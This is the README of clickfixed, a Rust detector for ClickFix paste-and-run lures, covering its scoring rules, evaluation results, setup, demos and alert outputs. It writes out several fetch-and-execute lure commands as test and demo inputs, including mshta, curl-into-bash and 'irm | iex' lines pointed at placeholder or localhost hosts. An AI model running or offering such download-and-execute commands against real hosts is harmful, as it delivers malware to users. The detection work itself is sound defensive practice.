# clickfixed

[![ci](https://github.com/uday-kasturi/clickfixed/actions/workflows/ci.yml/badge.svg)](https://github.com/uday-kasturi/clickfixed/actions/workflows/ci.yml)
[![license](https://img.shields.io/badge/license-Apache--2.0-blue.svg)](LICENSE)

Deterministic ClickFix ([MITRE T1204.004](https://attack.mitre.org/techniques/T1204/004/)) detector in Rust. It scores pasted and executed commands with explainable rules, decodes obfuscated commands, and sends alerts to syslog, Jira, Slack or Wazuh.

A ClickFix page tells you to paste a command into a terminal or the Windows Run dialog to "verify you are human". Nothing is exploited or downloaded, so mail filters, browser sandboxes and download reputation never see it, and EDR sees it only after it runs. clickfixed scores the command when the browser writes it to the clipboard, before you paste it. It runs on Linux and Windows.

> [!WARNING]
> `corpus/` holds attack command structures for testing. Every payload host is a `.invalid` placeholder (RFC 2606) that never resolves, and nothing in this repo runs corpus content. The engine decodes statically, in memory.

## How it works

```
Signal 1  PASTE-TIME   clipboard write → origin → features → shallow decode (≤2 layers, ≤5 ms) → warn/block
Signal 2  EXECUTION    exec event → match against clipboard hashes → alert immediately
Signal 3  POST-HOC     deep decode (≤5 layers, ≤500 ms) → IOC report (URLs, domains, IPs, paths)
```

Each signal runs on its own thread, and none waits on another. On Windows, the clipboard is scored again when the Run dialog or a terminal comes to the front, so a lure pasted into Win+R gets the Run-dialog weighting, and block mode clears it before Ctrl+V.

**Every verdict is a sum you can read.** Each feature is a named rule with a fixed weight in [`rules/default.toml`](crates/cfx-engine/src/rules/default.toml), such as `mshta` with a remote URL, fetch-and-execute, decode-and-execute, a hidden window, or decoy prose like "I am not a robot – Verification ID: 2165". The score is the sum of matched weights, minus allowlist dampening, times a context multiplier (Run dialog ×1.6, unclassified browser origin ×1.3). It warns at 1.0 and blocks at 2.0. Command length, `&&` count and entropy alone are never scored.

**The deobfuscator decodes statically:** base64 (including UTF-16 and gzip), base32, hex, octal and plain hex, percent encoding, char codes, rot13, string reversal, concatenation, the PowerShell format operator, and caret, backtick or quote insertion. Features run on every decoded layer.

**The allowlist only dampens.** Each entry must name a fact the attacker doesn't control (a classified origin, the source app, or a shape such as a JWT or PEM block), and it reduces only the features it lists. The loader rejects literal command strings. See [`rules/allowlist.toml`](crates/cfx-engine/src/rules/allowlist.toml).

## Results

Fast path on the bundled corpora. Reproduce with `cargo run --release -p cfx-eval -- run`. Full tables are in [`docs/RESULTS.md`](docs/RESULTS.md).

| corpus | rows | result |
|---|---|---|
| Malicious, reconstructed from public reporting | 25 | 25/25 detected, 15 blocked |
| Benign: install docs, dev and admin commands, secrets, terminal output | 400 | 1 false positive (warns, never blocks) |
| Encoded: 41 encoding families × 4 lures | 164 | 164/164 detected, also when typed with no browser context |
| Multi-line decoy prose | 16 | 15/16 |
| Benign look-alikes: encoded data, decode pipelines, scripts | 85 | 0 false positives |

Fast-path latency is p50 45 µs and p99 108 µs, against a 5 ms budget.

The reconstructed corpus follows command structure from vendor reporting, not sandbox captures, and I wrote the stress rows for this project. Both test the rules, not field detection rates. Expect false positives on clipboards nobody has tried yet, and please report them. [`docs/EVALUATION.md`](docs/EVALUATION.md) has the method and the change log.

## Setup on Linux

### Requirements

- Linux with an X11 or XWayland session (the clipboard is read through XFixes)
- Rust 1.88 or newer ([rustup](https://rustup.rs))
- `notify-send` for desktop notifications (`libnotify-bin` on Debian and Ubuntu)
- Optional: `auditd`, for exec capture that doesn't miss short-lived processes

### Install

```sh
git clone https://github.com/uday-kasturi/clickfixed.git
cd clickfixed
cargo install --locked --path crates/cfx-daemon    # installs ~/.cargo/bin/clickfixed
```

Check that it works:

```sh
clickfixed check 'mshta https://x.invalid/v.mp4 # I am not a robot'
```

### Configure

```sh
mkdir -p ~/.config/clickfixed
cp clickfixed.example.toml ~/.config/clickfixed/config.toml
cp -r templates ~/.config/clickfixed/      # template paths resolve next to config.toml
```

The example config is annotated. The settings most people change:

- `mode`: `warn` shows a notification, and `block` also replaces the clipboard on a Block verdict.
- `role`: `admin` tightens thresholds. No role loosens them.
- `[domains] vendor_docs`: sites whose install commands you trust. Keep it short, because every entry is a target.
- `[outputs.*]`: where alerts go. Only the local alert file is on by default.

Outputs that need a secret read it from an environment variable named in the config, never from the file itself. Put those variables in `~/.config/clickfixed/env` as `KEY=value` lines (see [`.env.example`](.env.example)) and `chmod 600` it. Then validate the setup without sending anything:

```sh
clickfixed alerts check --config ~/.config/clickfixed/config.toml
```

### Run

In the foreground:

```sh
clickfixed run --config ~/.config/clickfixed/config.toml
```

As a systemd user service, which also loads `~/.config/clickfixed/env`:

```sh
mkdir -p ~/.config/systemd/user
cp packaging/clickfixed.service ~/.config/systemd/user/
systemctl --user daemon-reload
systemctl --user enable --now clickfixed
journalctl --user -u clickfixed -f
```

The default exec source polls `/proc` every 50 ms and can miss very short commands. auditd catches them all but needs root:

```sh
sudo scripts/audit-rules.sh
sudo "$(command -v clickfixed)" run --exec audit --config ~/.config/clickfixed/config.toml
```

Logs carry a hash prefix, the verdict, feature names and the source app, never clipboard content. Warn and Block verdicts write a report to `~/.local/state/clickfixed/reports/` (mode 0600).

### Try it safely

```sh
demo/serve.sh                                            # serves 127.0.0.1:8765 only
clickfixed run --config ~/.config/clickfixed/config.toml  # in another terminal
```

Open `http://127.0.0.1:8765/lure.html` and click "I'm not a robot". The page copies `bash -c "$(curl -fsSL http://127.0.0.1:8765/verify.sh)" # I am not a robot …`, and clickfixed flags it. If you run it anyway, `verify.sh` only prints a message.

## Setup on Windows

Windows 10 or 11. No administrator rights are needed: clickfixed runs as you, because a Windows service can't see your clipboard or which window is in front.

### Install

Download `clickfixed.exe` from the latest [CI run](https://github.com/uday-kasturi/clickfixed/actions/workflows/ci.yml) (artifact `clickfixed-windows-x86_64`), or build it with [Rust](https://rustup.rs) and the Visual Studio C++ build tools:

```powershell
git clone https://github.com/uday-kasturi/clickfixed.git
cd clickfixed
cargo install --locked --path crates/cfx-daemon    # installs clickfixed.exe into ~\.cargo\bin
```

Check that it works: run `clickfixed check -`, paste or type a command such as `mshta https://x.invalid/v.mp4 # I am not a robot`, then press Enter, Ctrl+Z and Enter. clickfixed prints the verdict.

Don't pass a lure as an argument (`clickfixed check "mshta …"`) or through `echo … |` on Windows. Microsoft Defender refuses to start any process whose command line contains one ("Access is denied"), quarantines files that hold one, and PowerShell scans what you type. Typing it into `check -` goes through none of those.

### Configure and run

```powershell
New-Item -ItemType Directory -Force $env:APPDATA\clickfixed
Copy-Item clickfixed.example.toml $env:APPDATA\clickfixed\config.toml
Copy-Item -Recurse templates $env:APPDATA\clickfixed\
clickfixed run                       # finds %APPDATA%\clickfixed\config.toml on its own
```

The settings are the same as on Linux. Syslog has no local socket on Windows, so use `transport = "udp"` or `"tcp"`. Put secrets for alert outputs in user environment variables (System Properties → Environment Variables).

To start at login without a console window:

```powershell
clickfixed autostart enable          # adds a per-user Run entry; `disable` and `status` too
```

Logs then go to `%LOCALAPPDATA%\clickfixed\clickfixed.log`, next to `alerts.json` and `reports\`. Warnings appear as Windows notifications from a tray icon.

### Try it safely

Run `demo\serve.ps1` (needs Python), open `http://127.0.0.1:8765/lure.html` and click "I'm not a robot". On Windows the page copies `powershell -NoExit -c "irm http://127.0.0.1:8765/verify.ps1 | iex" # I am not a robot …`. clickfixed warns on the copy, and when you press Win+R it scores it again with the Run dialog and blocks. If you run it anyway, `verify.ps1` only prints a message.

### How it collects on Windows

- **Clipboard:** a clipboard listener. The window that owns the clipboard gives the source app, and Chromium and Firefox attach the page URL.
- **Paste target:** a foreground-window hook spots the Run dialog and terminals (Windows Terminal, PowerShell, cmd and console windows).
- **Execution:** a process poller, plus the RunMRU registry key, which records commands run from Win+R even if the process exits too fast to poll.

Defender and clickfixed overlap without getting in each other's way. Defender blocks some lures at the moment they would run; clickfixed warns or blocks at the copy and when the Run dialog opens, before anything runs, and alerts on what does run.

### Windows end-to-end test

`windows_e2e.exe` drives a real desktop session (copy, Win+R, paste, a terminal, Edge with the demo page) and checks clickfixed's log and alerts: 19 checks. Build it next to `clickfixed.exe`, copy the `demo` folder beside them, and run it from an interactive session without touching the keyboard for about 40 seconds:

```sh
cargo build --release -p cfx-daemon --bin clickfixed --example windows_e2e   # on Windows
```

Results land in `e2e\report.txt`. A disposable Windows 11 VM via [dockur/windows](https://github.com/dockur/windows) works well for this on a Linux machine.

## Alerting

Every output renders one ECS alert with the score and verdict, each matched rule and its weight, the command's SHA-256 and decoded form, the origin, host, user, and ATT&CK IDs. The alert never carries the raw clipboard text, and password-manager sources are refused. One severity mapping in the config sets the Wazuh level, syslog and CEF severity, Slack colour and Jira priority.

| output | what it does |
|---|---|
| stdout, file | ECS JSON lines. Wazuh, Filebeat or the Splunk forwarder can tail the file |
| syslog | CEF over UDP, TCP or (Linux) the local socket |
| webhook | POSTs a JSON template: Slack, or anything else you add a template for |
| Jira | One issue per host and command. Repeats add a comment instead of a new ticket |
| Wazuh | Decoder and rules in [`wazuh/`](wazuh/), generated from the severity mapping |

Each output runs on its own thread, so a failing webhook never delays the others. [`docs/ALERTING.md`](docs/ALERTING.md) covers the schema, templates, Jira deduplication and secrets, and [`docs/sample-alert.json`](docs/sample-alert.json) is a full example.

## Development

```sh
cargo test --workspace                     # unit, regression and stress tests
cargo run --release -p cfx-eval -- run     # detection, false positives, latency
cargo run --release -p cfx-eval -- explain 'irm https://x.invalid/a | iex' --target run_dialog --deep
python3 scripts/import_history.py && cargo run --release -p cfx-eval -- run --benign corpus/benign_local.csv
```

The last line scores your own shell history as extra benign rows. The output stays on your machine and is git-ignored.

```
crates/cfx-engine    detection engine, no OS APIs (CI builds it for wasm32 to prove it)
crates/cfx-collect   collectors: X11 clipboard and /proc or auditd on Linux; clipboard
                     listener, foreground hook, process poller and RunMRU on Windows
crates/cfx-daemon    the clickfixed binary
crates/cfx-alert     alert schema, severity mapping, outputs
crates/cfx-eval      evaluation harness and regression tests
corpus/              malicious, benign and stress corpora (scripts/ regenerates them)
templates/  wazuh/   alert templates and Wazuh files
demo/  packaging/    safe local lure, systemd unit
docs/                threat model, evaluation, results, alerting
```

## Platform scope

clickfixed runs on Linux and Windows. CI builds and tests both on every push. The engine is OS-independent; macOS needs its own collectors (see [Upcoming](#upcoming)). [`docs/THREAT_MODEL.md`](docs/THREAT_MODEL.md) covers what is and isn't in scope.

On Wayland, copies from native Wayland apps reach clickfixed through the compositor's clipboard bridge, so their browser origin is lost. The content is still scored.

## Upcoming

- **macOS:** pasteboard polling for the clipboard and `eslogger` for process events.
- **Windows, deeper:** ETW or Sysmon Event ID 1 process events, so short-lived processes aren't missed (needs administrator rights), and Win+X menu detection, which counts as a terminal today.

## License

[Apache-2.0](LICENSE)
